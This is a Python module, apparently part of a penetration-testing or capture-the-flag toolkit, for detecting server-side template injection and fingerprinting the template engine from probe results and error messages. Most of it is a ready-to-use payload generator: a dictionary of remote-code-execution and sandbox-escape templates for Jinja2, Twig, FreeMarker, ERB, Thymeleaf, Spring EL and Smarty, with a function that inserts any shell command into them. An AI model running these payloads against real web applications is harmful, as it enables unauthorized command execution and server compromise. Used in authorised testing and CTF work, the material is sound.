"""Server-Side Template Injection (SSTI) fingerprinting and payload generation.

Covers:
- Template engine decision tree probes (${7*7}, {{7*7}}, {{7*'7'}}, #{7*7}, etc.)
- Polyglot detection payloads
- Engine fingerprinting (Jinja2, Twig, Smarty, FreeMarker, Velocity, Thymeleaf, ERB, EJS, Pebble)
- RCE and sandbox escape payload generation per engine
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any


@dataclass
class SSTIEngine:
    """Represents a template engine definition."""

    name: str
    language: str
    sample_probe: str
    expected_eval: str
    confidence: float
    description: str


# Fingerprint probing signatures
# Tuple of (probe_expression, expected_evaluation_output, engine_name, language)
PROBES = [
    ("{{7*7}}", "49", "Jinja2 / Twig / Nunjucks", "Python / PHP / JS"),
    ("{{7*'7'}}", "7777777", "Jinja2", "Python"),
    ("{{7*'7'}}", "49", "Twig", "PHP"),
    ("${7*7}", "49", "Smarty / FreeMarker / Mako / SpringEL", "PHP / Java / Python"),
    ("#{7*7}", "49", "Ruby ERB / Java EL", "Ruby / Java"),
    ("<%= 7*7 %>", "49", "Ruby ERB / EJS", "Ruby / Node.js"),
    ("*{7*7}", "49", "Thymeleaf", "Java"),
    ("{{#with 's' as |string|}}{{string}}{{/with}}", "s", "Handlebars", "JavaScript"),
    ("${{7*7}}", "49", "Smarty (Strict)", "PHP"),
]

# Engine error signatures in HTTP responses
ENGINE_ERROR_SIGNATURES: dict[str, str] = {
    "jinja2.exceptions": "Jinja2 (Python)",
    "TemplateSyntaxError": "Jinja2 / Django / Tornado",
    "Twig\\Error": "Twig (PHP)",
    "freemarker.core": "FreeMarker (Java)",
    "org.apache.velocity": "Velocity (Java)",
    "org.thymeleaf": "Thymeleaf (Java)",
    "ActionView::Template::Error": "Ruby ERB (Ruby)",
    "ReferenceError: ejs": "EJS (JavaScript)",
    "mako.exceptions": "Mako (Python)",
    "SmartyCompilerException": "Smarty (PHP)",
}

# Payloads for arbitrary command execution / flag exfiltration
PAYLOADS: dict[str, list[dict[str, str]]] = {
    "jinja2": [
        {
            "name": "Jinja2 Context Subclass Walk (Popen)",
            "template": "{{ ''.__class__.__mro__[1].__subclasses__()[133]('COMMAND',shell=True,stdout=-1).communicate()[0].strip() }}",
        },
        {
            "name": "Jinja2 Cycler Init Globals (Universal)",
            "template": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('COMMAND').read() }}",
        },
        {
            "name": "Jinja2 Filter Bypass (request args)",
            "template": "{{ request.application.__globals__.__builtins__.__import__('os').popen(request.args.cmd).read() }}",
        },
    ],
    "twig": [
        {
            "name": "Twig 1.x / 2.x Filter RCE",
            "template": "{{ ['COMMAND']|filter('system') }}",
        },
        {
            "name": "Twig Register Undefined Filter",
            "template": "{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('COMMAND') }}",
        },
    ],
    "freemarker": [
        {
            "name": "FreeMarker Execute Utility",
            "template": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"COMMAND\") }",
        },
        {
            "name": "FreeMarker ObjectConstructor",
            "template": "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ ob(\"java.lang.ProcessBuilder\",[\"sh\",\"-c\",\"COMMAND\"]).start() }",
        },
    ],
    "erb": [
        {
            "name": "Ruby ERB Backticks",
            "template": "<%= `COMMAND` %>",
        },
        {
            "name": "Ruby ERB IO.popen",
            "template": "<%= IO.popen('COMMAND').readlines.join %>",
        },
    ],
    "thymeleaf": [
        {
            "name": "Thymeleaf Spring EL Runtime Exec",
            "template": "__${T(java.lang.Runtime).getRuntime().exec('COMMAND')}__::.x",
        },
    ],
    "springel": [
        {
            "name": "Spring EL Runtime Exec",
            "template": "${T(java.lang.Runtime).getRuntime().exec('COMMAND')}",
        },
    ],
    "smarty": [
        {
            "name": "Smarty System Tag",
            "template": "{system('COMMAND')}",
        },
    ],
}


def get_detection_probes() -> list[tuple[str, str, str]]:
    """Returns the ordered list of SSTI discrimination probe tuples (expression, expected, candidate_engine)."""
    return [(p[0], p[1], p[2]) for p in PROBES]


def fingerprint_ssti(results: dict[str, str]) -> dict[str, Any]:
    """Analyzes a mapping of {probe_expression: evaluated_response_body}.

    Determines the template engine based on the evaluation tree.
    """
    detected_engine = "Unknown"
    confidence = 0.0
    notes: list[str] = []

    has_7x7_double_curly = "49" in results.get("{{7*7}}", "")
    has_7x7_dollar = "49" in results.get("${7*7}", "")
    has_7x7_hash = "49" in results.get("#{7*7}", "")
    has_7x7_erb = "49" in results.get("<%= 7*7 %>", "")

    if has_7x7_double_curly:
        # Check Jinja2 vs Twig distinction: {{7*'7'}}
        probe_mul = results.get("{{7*'7'}}", "")
        if "7777777" in probe_mul:
            detected_engine = "Jinja2"
            confidence = 0.95
            notes.append("String repetition {{7*'7'}} evaluated to 7777777 (Python behavior)")
        elif "49" in probe_mul:
            detected_engine = "Twig"
            confidence = 0.95
            notes.append("String multiplication {{7*'7'}} evaluated to 49 (PHP type coercion)")
        else:
            detected_engine = "Jinja2 / Twig / Nunjucks"
            confidence = 0.70
    elif has_7x7_dollar:
        detected_engine = "FreeMarker / Smarty / SpringEL"
        confidence = 0.75
    elif has_7x7_hash:
        detected_engine = "Ruby ERB / Java EL"
        confidence = 0.75
    elif has_7x7_erb:
        detected_engine = "Ruby ERB / EJS"
        confidence = 0.85

    return {
        "engine": detected_engine,
        "confidence": confidence,
        "notes": notes,
    }


def identify_engine_from_error(body: str) -> str | None:
    """Checks whether an error trace in the response body reveals the template engine."""
    for sig, engine in ENGINE_ERROR_SIGNATURES.items():
        if sig in body:
            return engine
    return None


def generate_payload(engine: str, command: str = "id") -> list[dict[str, str]]:
    """Generates ready-to-use RCE / flag extraction payloads for the given engine."""
    norm = engine.lower().split()[0].replace("/", "")
    payloads = PAYLOADS.get(norm, [])
    if not payloads:
        # Try substring match
        for k, v in PAYLOADS.items():
            if k in norm:
                payloads = v
                break

    rendered = []
    for p in payloads:
        rendered.append(
            {
                "name": p["name"],
                "payload": p["template"].replace("COMMAND", command),
            }
        )
    return rendered
